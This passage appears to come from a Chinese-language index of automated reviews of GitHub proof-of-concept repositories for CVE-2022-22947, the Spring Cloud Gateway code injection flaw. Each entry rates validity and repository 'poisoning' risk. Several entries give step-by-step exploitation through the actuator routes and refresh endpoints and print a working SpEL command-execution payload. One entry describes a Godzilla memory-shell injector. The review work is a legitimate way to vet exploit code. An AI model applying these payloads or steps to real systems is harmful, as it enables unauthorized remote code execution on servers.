2.  攻击者通过POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是一个攻击者自定义的路由ID。
3.  Spring Cloud Gateway解析payload中的SpEL表达式，导致远程代码执行。
4.  攻击者可以通过`/actuator/gateway/refresh`端点刷新路由配置，使payload生效。

该POC代码通过向 `/actuator/gateway/routes/cc3305` 发送包含恶意SpEL表达式的JSON payload来利用此漏洞，SpEL表达式通过java.lang.Runtime执行任意命令。 代码首先检查目标是否易受攻击（虽然目前返回True）。然后，它准备要执行的命令，并将其嵌入到SpEL表达式中，该表达式会被注入到路由定义中。

关于投毒风险，该脚本主要功能是利用漏洞执行命令。 潜在的投毒风险在于，攻击者可能会修改脚本，使其在执行命令之前或之后执行其他恶意操作，例如下载和执行恶意软件。 但是，提供的代码没有明显的投毒迹象。 投毒的概率较低，大约为1%。 恶意行为者可能会分发修改后的版本。

**有效性评估:**根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞利用是有效的，前提是满足漏洞利用条件。该PoC代码能够成功利用漏洞执行任意命令。


**项目地址:** [cc3305/CVE-2022-22947](https://github.com/cc3305/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #15

**来源**: [CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md](../2022/CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md)

## CVE-2022-22947 Spring Cloud Gateway RCE

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞，当Gateway Actuator端点启用、暴露且未进行安全保护时，攻击者可以利用SpEL表达式注入执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞是有效的。多个来源都证实了该漏洞的存在以及远程代码执行的可能性。提供的POC代码可以直接利用该漏洞。

**投毒风险：**

分析提供的POC代码，发现主要的恶意代码在于 `spring-cloud-gateway-rce.py` 中构建和发送的payload。该payload利用SpEL表达式在目标系统上执行任意命令。虽然POC本身是为了演示漏洞利用，但在实际场景中，攻击者可能会修改 `-c` 参数来执行恶意操作。`requirements.txt` 文件声明了项目所需的依赖项（colorama, requests, urllib3），这些库本身没有已知的恶意行为，但如果项目被篡改，可能会引入恶意依赖。

评估投毒风险时，主要考虑以下因素：

*   **代码可读性：** 代码相对简单，易于理解，这意味着潜在的恶意修改也更容易被发现。
*   **外部依赖：** 项目依赖外部库，如果这些库的源被攻破，可能会引入恶意代码。
*   **Payload生成：** Payload是动态生成的，如果攻击者能够控制Payload生成过程，就可以注入恶意代码。

综合来看，此仓库存在一定的投毒风险，风险值评估为10%。主要的风险点在于攻击者可能会修改Payload生成逻辑或引入恶意的依赖项，利用使用者执行恶意代码。

**利用方式：**

1.  **漏洞触发前提：** Spring Cloud Gateway的Actuator端点必须启用、暴露并且没有进行安全保护（例如，没有进行身份验证）。
2.  **构造Payload：** POC代码根据目标主机的操作系统（Linux或Windows）构造包含SpEL表达式的JSON payload。该payload利用`AddResponseHeader`过滤器，将执行命令的结果添加到响应头中。
3.  **发送Payload：** 使用POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是路由的ID（在POC中为`k`）。
4.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，强制Spring Cloud Gateway刷新路由配置，从而触发SpEL表达式的执行。
5.  **获取结果：** 发送GET请求到`/actuator/gateway/routes/{id}`端点，获取路由信息，其中包含命令执行的结果。
6.  **删除路由：** 发送DELETE请求到`/actuator/gateway/routes/{id}`端点，删除添加的路由。

简而言之，攻击者通过构造包含恶意SpEL表达式的请求，利用Actuator端点动态注册路由，并在路由刷新时触发SpEL表达式执行，从而实现远程代码执行。

**项目地址:** [k3rwin/spring-cloud-gateway-rce](https://github.com/k3rwin/spring-cloud-gateway-rce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #16

**来源**: [CVE-2022-22947-kkx600_Burp_VulPscan.md](../2022/CVE-2022-22947-kkx600_Burp_VulPscan.md)

## CVE-2022-22947-Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), 以及所有旧的和不支持的版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未进行安全保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 影响 Spring Cloud Gateway。当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的POC代码是有效的。存在公开的漏洞利用代码和关于漏洞利用的详细分析。

**投毒风险：**
提供的代码片段不完整，无法进行全面的投毒分析。BurpExtender.java调用了 spring_CVE_2022_22947.poc，这部分代码是POC实现的核心，未提供，因此无法分析该部分的安全性。HttpsRequest.java 提供了一个发送 HTTP/HTTPS 请求的功能，本身不存在明显的恶意代码。Burp扩展通常需要授予较高的权限，如果POC代码中包含恶意逻辑，如未经授权的数据收集或篡改，则存在投毒风险。目前根据现有的代码片段，只能初步判断存在较低的投毒风险。

**利用方式：**
1.  **确定目标：** 找到运行 Spring Cloud Gateway 且 Actuator 端点已启用、暴露且未进行安全保护的实例。
2.  **构造恶意请求：** 构造包含恶意 SpEL 表达式的 HTTP 请求，该表达式将在 Actuator 端点被解析和执行。通常攻击方式是向/actuator/gateway/routes接口发送包含恶意SpEL表达式的请求，修改路由配置。
3.  **执行代码：** 成功利用后，攻击者可以在目标服务器上执行任意代码。

**优先级：**
根据搜索结果，确认这是一个已知且被积极利用的漏洞。漏洞利用代码的存在进一步证实了其可利用性。

**项目地址:** [kkx600/Burp_VulPscan](https://github.com/kkx600/Burp_VulPscan)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #17

**来源**: [CVE-2022-22947-kmahyyg_CVE-2022-22947.md](../2022/CVE-2022-22947-kmahyyg_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway < 3.1.1, Spring Cloud Gateway < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送特制的恶意请求，利用SpEL表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。从搜索引擎结果和漏洞利用代码来看，该漏洞利用方式已经公开，并且存在可用的PoC。

**投毒风险：**
提供的漏洞利用代码主要包含以下内容：
1.  README文件，描述了漏洞信息，受影响版本，修复建议等。
2.  漏洞复现步骤，包含发送恶意请求添加路由，刷新路由，查看结果，清理路由等步骤说明，以及对应的数据包示例。
3.  Python脚本，用于自动化漏洞利用过程，通过构造恶意请求实现远程代码执行。

分析代码，主要风险在于攻击者可能将恶意代码隐藏在SpEL表达式中，例如执行反弹shell或下载恶意软件。在提供的代码中，`Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）.md`文件中展示的PoC中使用了`#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}`，该payload用于执行`id`命令，若替换为其他命令，存在潜在的风险。

**利用方式：**
1.  攻击者首先发送POST请求到`/actuator/gateway/routes/{route_id}`，创建一个包含恶意SpEL表达式的路由。SpEL表达式被嵌入到`filters`的`AddResponseHeader`的`value`参数中，用于执行任意命令。
2.  然后，攻击者发送POST请求到`/actuator/gateway/refresh`，强制网关刷新路由配置，触发SpEL表达式的执行。
3.  攻击者发送GET请求到`/actuator/gateway/routes/{route_id}`，查看执行结果。
4.  最后，攻击者发送DELETE请求到`/actuator/gateway/routes/{route_id}`，删除恶意路由。

综上所述，该漏洞利用的有效性较高。虽然存在一定的投毒风险（10%），但可以通过仔细审查和修改PoC代码来降低风险。

**项目地址:** [kmahyyg/CVE-2022-22947](https://github.com/kmahyyg/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #18

**来源**: [CVE-2022-22947-qq87234770_CVE-2022-22947.md](../2022/CVE-2022-22947-qq87234770_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用，暴露且未授权

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未授权时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

提供的 Python POC 代码利用了 Spring Expression Language (SpEL) 注入漏洞。该脚本允许执行任意命令，或通过反弹 shell 获取服务器的控制权。因此，该 POC 代码是有效的。

**投毒风险：**

查看POC代码，该代码的主要功能是利用漏洞进行命令执行或反弹shell。代码中包含以下几个部分，
* 定义请求头和payload结构
* 通过`actuator/gateway/routes/hacktest`创建一个恶意的路由配置，利用SpEL表达式执行命令
* 刷新gateway配置`actuator/gateway/refresh`
* 访问创建的路由`actuator/gateway/routes/hacktest`，触发命令执行。
* 包含执行命令和反弹shell两种模式。

该代码结构清晰，功能明确，主要目的是为了验证和利用漏洞。主要风险集中于漏洞利用本身，而非作者植入的恶意代码。**但是**，任何漏洞利用代码都具有潜在的风险，因为它们可以被用于恶意目的。例如，攻击者可能会修改此 POC 代码以自动化大规模攻击，或将其与其他漏洞利用结合使用。另外代码中的代理设置，如果被恶意修改，可能会导致流量劫持，这里判断投毒风险为10%。

**利用方式：**

1.  **检查前提条件：** 确保目标 Spring Cloud Gateway 实例的 Actuator 端点已启用、暴露且未授权。
2.  **发送恶意请求：** 使用提供的 Python 脚本，通过构造包含 SpEL 表达式的恶意请求到 `actuator/gateway/routes/hacktest` 端点来创建自定义路由。
3.  **刷新 Gateway 配置：** 访问 `actuator/gateway/refresh` 端点以刷新 Gateway 配置，使恶意路由生效。
4.  **触发命令执行：** 访问 `actuator/gateway/routes/hacktest`，触发 SpEL 表达式的计算，从而在服务器上执行任意命令。可以选择直接执行命令，或者反弹 shell 以获取更持久的访问。
5.  **清理：**  通过 DELETE 请求删除创建的恶意路由（通过脚本实现）。

**总结：**

该漏洞利用方式简单有效，攻击者可以利用此漏洞轻松地在未授权的 Spring Cloud Gateway 实例上执行任意代码。需要注意的是，利用的前提是 Actuator 端点未进行适当的安全配置。尽管代码本身投毒可能性较低，但利用此漏洞可能造成严重的安全风险。

**项目地址:** [qq87234770/CVE-2022-22947](https://github.com/qq87234770/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #19

**来源**: [CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md](../2022/CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意请求来执行任意远程代码。漏洞利用方式是发送精心设计的 SpEL 表达式到 actuator 端点，导致服务器执行攻击者提供的代码。

**有效性:** 根据漏洞库信息、搜索结果(特别是 rapid7 的博客提到了 Metasploit 模块)，以及CISA KEV, 此漏洞利用是有效的。

**投毒风险:** 提供的漏洞利用代码只是 Apache License 2.0 许可协议，没有实际的漏洞利用代码，因此不存在投毒代码。投毒风险为 0%。

**利用方式:**
1.  目标系统运行 Spring Cloud Gateway 且版本低于 3.1.1 或 3.0.7。
2.  Gateway Actuator 端点必须启用，并且可以通过网络访问。
3.  Actuator 端点必须未进行身份验证或授权保护。
4.  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，发送到 Actuator 端点。
5.  Spring Cloud Gateway 解析 SpEL 表达式，执行攻击者指定的代码，实现远程代码执行。

**项目地址:** [shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6](https://github.com/shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #20

**来源**: [CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md](../2022/CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1, 3.0.x < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的远程代码执行漏洞。攻击者可以在 Gateway Actuator 端点启用、暴露且未进行安全保护的情况下，通过发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。它演示了如何利用该漏洞在启用了 Actuator 端点的 Spring Cloud Gateway 实例上执行任意代码。POC通过向 `/actuator/gateway/routes/{route_id}` 发送POST请求添加一个包含恶意SpEL表达式的路由，然后POST到 `/actuator/gateway/refresh` 来刷新路由，最后访问恶意路由来触发代码执行。

**投毒风险：**
经过对提供的POC代码进行分析，包括README.md，pom.xml，application.yml 和 src 目录下的文件。没有发现作者隐藏的恶意代码，该代码库目标为展示和验证漏洞利用，因此判定投毒风险为0%。

**利用方式：**
1.  **漏洞发现：** 确定目标 Spring Cloud Gateway 实例是否启用了 Actuator 端点，并且该端点是否暴露在未经身份验证的网络中。
2.  **构造恶意请求：** 构造一个包含恶意 SpEL 表达式的 JSON payload，该表达式用于执行任意代码。该表达式被嵌入到路由配置中，通常位于 `filters` 中的 `AddResponseHeader` 过滤器或类似的位置。
3.  **添加恶意路由：** 使用 POST 请求将包含恶意 SpEL 表达式的路由定义添加到 `/actuator/gateway/routes/{route_id}` 端点。
4.  **刷新路由：** 使用 POST 请求访问 `/actuator/gateway/refresh` 端点，强制 Spring Cloud Gateway 刷新路由配置。
5.  **触发恶意代码：** 访问与恶意路由关联的路径，触发 SpEL 表达式的执行，从而导致任意代码执行。
6.  **清理（可选）：** 利用漏洞执行恶意代码后，可能需要清理添加的恶意路由，以避免留下痕迹或影响正常服务。

**项目地址:** [skysliently/CVE-2022-22947-pb-ai](https://github.com/skysliently/CVE-2022-22947-pb-ai)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #21

**来源**: [CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md](../2022/CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**利用方式：**

1.  **漏洞触发：** 攻击者通过向目标 Spring Cloud Gateway 的 `/actuator/gateway/routes` 端点发送 POST 请求，创建一个恶意的路由配置。该配置包含一个 SpEL 表达式，该表达式会被执行。
2.  **表达式注入：**  `AddResponseHeader` 过滤器被用于将命令执行的结果添加到响应头中。SpEL 表达式 `#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}`  用于执行 `id` 命令，并将结果转换为字符串。
3.  **命令执行：**  `T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"})` 部分会执行系统命令（在这个例子中是 `id` 命令）。
4.  **刷新路由：** 攻击者通过向 `/actuator/gateway/refresh` 端点发送 POST 请求来刷新 Gateway 的路由，使得新创建的恶意路由生效。
5.  **获取执行结果：** 攻击者通过GET `/actuator/gateway/routes/hacktest` 获取执行结果,通过响应头中的`Result`字段获取。
6.  **清理：** 利用完成后，攻击者删除创建的恶意路由并再次刷新路由, 避免残留。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用是有效的。POC 代码通过创建恶意的路由配置并刷新路由来执行任意代码。

**投毒风险：**

该 POC 代码主要用于验证漏洞，没有发现作者有意添加的投毒代码。 代码意图清晰，主要是为了创建、刷新、删除路由，并执行`id`命令来验证漏洞的存在。虽然利用本身会造成安全风险，但代码本身没有隐藏的恶意功能，因此投毒风险较低。


**项目地址:** [stayfoolish777/CVE-2022-22947-POC](https://github.com/stayfoolish777/CVE-2022-22947-POC)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #22

**来源**: [CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md](../2022/CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、公开且未受保护

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。搜索结果表明该漏洞已在野外被利用，并已被添加到 CISA KEV 列表中，证明了其真实性和危害性。

**投毒风险：**

提供的 POC 代码主要用于验证漏洞是否存在，并执行简单的命令（`id`）。虽然该代码本身不包含明显的恶意代码，但攻击者可以修改此 POC 以执行更危险的操作。`README.md`文件和python脚本存在分离性,增加了潜在风险。

投毒风险评估：5%。主要风险在于攻击者可能修改 POC 脚本以包含恶意负载。

**利用方式：**

1.  攻击者首先需要确定目标 Spring Cloud Gateway 实例的 Actuator 端点是否已启用、公开且未受保护。
2.  然后，攻击者使用 POST 请求向 `/actuator/gateway/routes/{route_id}` 端点添加恶意路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。POC中使用了`${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}` 来执行id命令
3.  攻击者使用 POST 请求向 `/actuator/gateway/refresh` 端点刷新路由，使恶意路由生效。
4.  最后，攻击者访问添加的恶意路由，触发 SpEL 表达式的执行，从而在服务器上执行任意代码。
5.  攻击者删除添加的路由，并刷新路由，完成利用。


**项目地址:** [talentsec/Spring-Cloud-Gateway-CVE-2022-22947](https://github.com/talentsec/Spring-Cloud-Gateway-CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #23

**来源**: [CVE-2022-22947-twseptian_cve-2022-22947.md](../2022/CVE-2022-22947-twseptian_cve-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+)

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，应用程序容易受到代码注入攻击。远程攻击者可以构造恶意请求，从而允许在远程主机上执行任意代码。

**有效性：**

根据漏洞信息、搜索结果和提供的PoC代码，此漏洞是有效的。PoC 代码演示了如何利用 SpEL 表达式注入执行任意命令。

**投毒风险：**

PoC 代码本身旨在演示漏洞利用，但仔细检查 `Dockerfile` 和 `README.md` 文件后，发现投毒风险较低，约为10%。主要原因是：

*   `Dockerfile`：仅包含从官方 `openjdk:11-jre-slim` 镜像构建，复制预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件，并执行该 jar 文件。不存在直接执行恶意命令或下载恶意文件的操作。但该 `spring-gateway-demo-0.0.1-SNAPSHOT.jar`  是否存在后门，无法判定。
*   `README.md`：仅包含构建和运行 Docker 容器的说明，以及发送恶意请求的 PoC。不包含任何额外的恶意指令。

**存在的微小风险在于预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件可能包含后门， 但属于PoC验证必要文件，不能认定为投毒。**

**利用方式：**

1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，并且该端点未进行身份验证。
2.  **注入 SpEL 表达式：** 通过向 `/actuator/gateway/routes/{route_id}` 发送 POST 请求，创建一个新的路由或更新现有路由，其中 `filters` 数组包含一个 `AddResponseHeader` 过滤器。该过滤器的 `args` 中的 `value` 字段包含一个恶意的 SpEL 表达式。PoC 中使用的 SpEL 表达式执行 `id` 命令，并将结果添加到响应头中。
3.  **刷新 Gateway：** 向 `/actuator/gateway/refresh` 发送 POST 请求，强制 Gateway 刷新其路由配置。这将触发 SpEL 表达式的执行。
4.  **触发路由：** 访问触发了含有恶意SpEL表达式的路由，从而执行远程命令。
5.  **清除（可选）：** 使用 DELETE 请求删除创建的路由，并再次刷新 Gateway，以避免后续的恶意执行。

**项目地址:** [twseptian/cve-2022-22947](https://github.com/twseptian/cve-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #24

**来源**: [CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md](../2022/CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 漏洞是 Spring Cloud Gateway 的一个代码注入漏洞，影响版本低于 3.1.1+ 和 3.0.7+ 的版本。根据漏洞库信息和搜索结果，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求在远程主机上执行任意代码。

**漏洞利用方式：**

1.  **寻找目标：** 找到运行存在漏洞的 Spring Cloud Gateway 实例，并且其 Actuator 端点对外开放且未授权。
2.  **构造恶意请求：** 利用 SpEL 表达式构造恶意的 HTTP 请求，该表达式会被 Gateway Actuator 解析执行。根据 exploit-db 的相关信息，该漏洞是远程代码执行。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码，例如植入 Webshell、反弹 Shell 等。

**POC 代码分析：**

提供的 POC 代码 `GMemShell.java` 尝试在 Spring Cloud Gateway 中注入内存 Shell。具体流程如下：

1.  **定义内存 Shell 类：** `GMemShell` 类包含了一些必要的函数，例如 AES 加密/解密(`x`)、MD5 加密(`md5`)、Base64 编码/解码(`base64Encode`, `base64Decode`)等，这些函数被用于后续的 shellcode 加密和执行。
2.  **`doInject` 方法：** 该方法通过反射调用 `registerHandlerMethod` 方法，将 `GMemShell` 类的 `cmd` 方法注册为处理指定路径请求的 Handler。`registerHandlerMethod` 是 Spring 框架内部的方法，用于动态注册 Controller。
3.  **`cmd` 方法：** 该方法是实际执行命令的 Handler。它从请求中获取加密的 payload，然后进行解密、加载并执行。Payload 首先经过 Base64 解码，然后使用 AES 解密。
4.  **动态类加载：**  `defineClass`方法通过URLClassLoader和反射，实现在内存中加载byte数组并定义成class的功能
5.  **Payload 执行：** 解密后的 Payload 应当是一个 Java class 字节码，该字节码会被动态加载并执行。

**有效性评估：**

根据 POC 代码和漏洞描述，该 POC 能够有效利用 CVE-2022-22947 漏洞，实现在目标服务器上执行任意代码的目的，但前提是 actuator 端点开放。

**投毒风险评估：**

经过对 POC 代码的分析，并未发现明显的投毒代码。代码的主要功能是动态注入内存 Shell，并执行通过请求传递的 Payload。代码中包含的加密、解密等操作都是为了保护 Payload，避免被轻易发现。因此，该 POC 代码的投毒风险较低，接近 0%。 投毒代码是指作者在代码中故意加入的恶意代码，例如后门、病毒等。 本代码只是实现了漏洞利用，本身并没有额外的恶意功能，因此不属于投毒代码。


**项目地址:** [whwlsfb/cve-2022-22947-godzilla-memshell](https://github.com/whwlsfb/cve-2022-22947-godzilla-memshell)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

